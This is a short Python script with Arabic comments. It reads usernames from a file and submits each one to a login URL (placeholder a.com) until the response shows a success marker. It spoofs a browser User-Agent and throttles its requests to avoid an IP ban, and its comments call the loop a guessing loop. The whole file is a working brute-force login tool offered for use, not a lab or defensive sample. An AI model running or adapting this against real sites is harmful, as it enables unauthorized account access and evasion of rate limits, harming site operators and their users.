import requests
import time
import sys

# ===================== إعدادات الأداة =====================
TARGET_URL = "http://a.com/login"      # رابط تسجيل الدخول
SUCCESS_URL = "http://a.com/status"    # الرابط الذي يظهر بعد النجاح
# نص يظهر فقط عند نجاح الدخول (مثل: "خروج"، "Welcome"، "Profile")
# تأكد من كتابته بدقة كما يظهر في الصفحة
SUCCESS_INDICATOR = "Logout" 
DELAY = 2                              # التأخير بالثواني بين المحاولات
FILE_NAME = "users.txt"                # ملف اليوزرات
# =========================================================

def run_checker():
    # 1. محاولة قراءة ملف اليوزرات
    try:
        with open(FILE_NAME, "r", encoding="utf-8") as f:
            user_list = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] خطأ: الملف '{FILE_NAME}' غير موجود في نفس المجلد!")
        return

    if not user_list:
        print("[-] خطأ: ملف اليوزرات فارغ!")
        return

    print(f"[*] تم تحميل {len(user_list)} يوزر. بدء الفحص...")
    print(f"[*] سيتم التوقف عند الوصول لرابط: {SUCCESS_URL} أو ظهور نص: '{SUCCESS_INDICATOR}'")
    print("-" * 50)

    # 2. إنشاء الجلسة وتحديث الـ User-Agent لتبدو كمتصفح حقيقي
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
    })

    # 3. حلقة التخمين
    for i, user in enumerate(user_list, 1):
        print(f"[{i}/{len(user_list)}] محاولة اليوزر: {user} -> ", end="", flush=True)

        try:
            # إرسال الطلب مع تفعيل تتبع التحويلات (Redirects)
            params = {'username': user}
            response = session.get(
                TARGET_URL, 
                params=params, 
                timeout=15, 
                allow_redirects=True
            )

            # 4. معايير التحقق من النجاح (شرط التوقف)
            # الشرط الأول: هل الرابط النهائي يحتوي على رابط الحالة؟
            is_success_url = SUCCESS_URL.lower() in response.url.lower()
            
            # الشرط الثاني: هل محتوى الصفحة يحتوي على نص النجاح؟
            is_success_text = SUCCESS_INDICATOR.lower() in response.text.lower()

            if is_success_url or is_success_text:
                print("\n\n" + "✅" * 20)
                print(f"[ SUCCESSFULLY FOUND ]")
                print(f"[ USER ]: {user}")
                print(f"[ FINAL URL ]: {response.url}")
                print("✅" * 20)
                
                # إيقاف البرنامج كلياً فور النجاح
                sys.exit() 

            else:
                # إذا لم يتحقق النجاح، يطبع الرفض وينتظر المحاولة التالية
                print("❌ رفض")

        except requests.exceptions.RequestException as e:
            print(f"\n[-] خطأ في الاتصال: {e}")
        
        # التأخير لضمان عدم تداخل الطلبات أو حظر الـ IP
        time.sleep(DELAY)

    print("\n[-] تم الانتهاء من القائمة بالكامل دون العثور على اليوزر الصحيح.")

if __name__ == "__main__":
    try:
        run_checker()
    except KeyboardInterrupt:
        print("\n[!] تم إيقاف البرنامج بواسطة المستخدم.")
        sys.exit()